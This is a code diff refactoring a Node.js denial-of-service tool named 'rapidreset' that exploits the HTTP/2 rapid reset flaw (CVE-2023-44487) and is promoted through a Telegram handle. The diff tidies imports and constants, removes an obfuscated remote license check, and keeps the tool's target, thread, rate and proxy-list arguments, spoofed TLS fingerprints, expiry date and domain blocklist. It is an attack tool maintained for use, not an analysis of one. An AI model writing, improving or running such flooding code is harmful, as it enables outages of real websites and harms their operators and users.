@@ -1,51 +1,39 @@
-const net = require('net');
-const tls = require('tls');
+// rapidreset — HTTP/2 rapid reset (CVE-2023-44487)
+// Telegram: @fasthttps
+
+const net = require('node:net');
+const tls = require('node:tls');
+const cluster = require('node:cluster');
+const fs = require('node:fs');
+const os = require('node:os');
+const crypto = require('node:crypto');
+const { EventEmitter } = require('node:events');
 const HPACK = require('hpack');
-const cluster = require('cluster');
-const fs = require('fs');
-const os = require('os');
-const crypto = require('crypto');
-const https = require('https');
 
-require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
-
+EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
 process.setMaxListeners(0);
 
-process.on('uncaughtException', function (e) {
-    console.log(e)
+process.on('uncaughtException', (error) => {
+    console.error('[fatal]', error);
 });
-process.on('unhandledRejection', function (e) {
-    console.log(e)
+process.on('unhandledRejection', (error) => {
+    console.error('[rejection]', error);
 });
 
-const uiiu = 'https'
-const phvk = '://raw.';
-const dmps = 'githubuser';
-const ohhv = 'content.com/';
-const xioe = 'mitenkaa/';
-const ssjc = 'license-';
-const zasd = 'for-tornado/';
-const ihoo = 'main/';
-const lias = 'license';
+const VERSION = '2.5';
+const EXPIRY_DATE = new Date('2077-10-25');
+const BLOCKED_DOMAINS = ['.gov', '.edu', '.by', '.ua'];
 
-const fwtgws = uiiu + phvk + dmps + ohhv + xioe + ssjc + zasd + ihoo + lias;
-
-const statusesQ = []
-let statuses = {}
+const statusesQ = [];
+let statuses = {};
 let shouldCloseSession = process.argv.includes('--close');
 let useRandPath = process.argv.includes('--randpath');
-let ver = '2.5';
 let cookiesToInclude = '';
-
-const blockedDomain = [".gov", ".edu", ".by", ".ua"];
-const license = "1";
 
 const timestamp = Date.now();
 const timestampString = timestamp.toString().substring(0, 10);
-const currentDate = new Date();
-const targetDate = new Date('2077-10-25');
 
-const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
+const PREFACE = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';
 const reqmethod = process.argv[2];
 const target = process.argv[3];
 const time = process.argv[4];
@@ -89,7 +77,7 @@ const debugMode = process.argv.includes('--debug') && forceHttp != 1;
 if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     console.clear();
     console.error(`
-    rapidreset ${ver} · CVE-2023-44487
+    rapidreset ${VERSION} · CVE-2023-44487
     Telegram: @fasthttps
 
     Usage:
@@ -121,13 +109,13 @@ let hcookie = '';
 const url = new URL(target);
 const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
 
-if (currentDate > targetDate) {
+if (new Date() > EXPIRY_DATE) {
     console.error('[#1] This build is outdated; contact @fasthttps');
     process.exit(1);
 }
 
-if (blockedDomain.some((suffix) => url.hostname.endsWith(suffix))) {
-    console.log(`[#2] Blocked target: ${blockedDomain.join(', ')} is on the blacklist`);
+if (BLOCKED_DOMAINS.some((suffix) => url.hostname.endsWith(suffix))) {
+    console.log(`[#2] Blocked target: ${BLOCKED_DOMAINS.join(', ')} is on the blacklist`);
     process.exit(1);
 }
 
@@ -368,30 +356,6 @@ function generateSpoofedFingerprint() {
     return sha256Fingerprint;
 }
 
-function checkLicense(license) {
-    const licenseURL = new URL(fwtgws);
-    const request = https.request(licenseURL);
-    request.setTimeout(15 * 1000);
-    request.on('response', response => {
-        var data = '';
-        response.on('data', chunk => data += chunk);
-        response.on('end', function () {
-            if (data.trim() === license) {
-            } else {
-                process.exit(1);
-            }
-        });
-    });
-    request.on('timeout', function () {
-        console.log('[#8] License check timed out');
-        process.exit(1);
-    });
-    request.on('error', error => {
-        console.log('[#9] License check failed');
-        process.exit(1);
-    });
-    request.end();
-}
 
 const generatedFP = generateSpoofedFingerprint()
 
@@ -827,7 +791,7 @@ function runMaster() {
 
     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
     console.log(`
-  rapidreset ${ver} · CVE-2023-44487
+  rapidreset ${VERSION} · CVE-2023-44487
   Telegram: @fasthttps
   ──────────────────────────────────────────
   method     ${reqmethod}
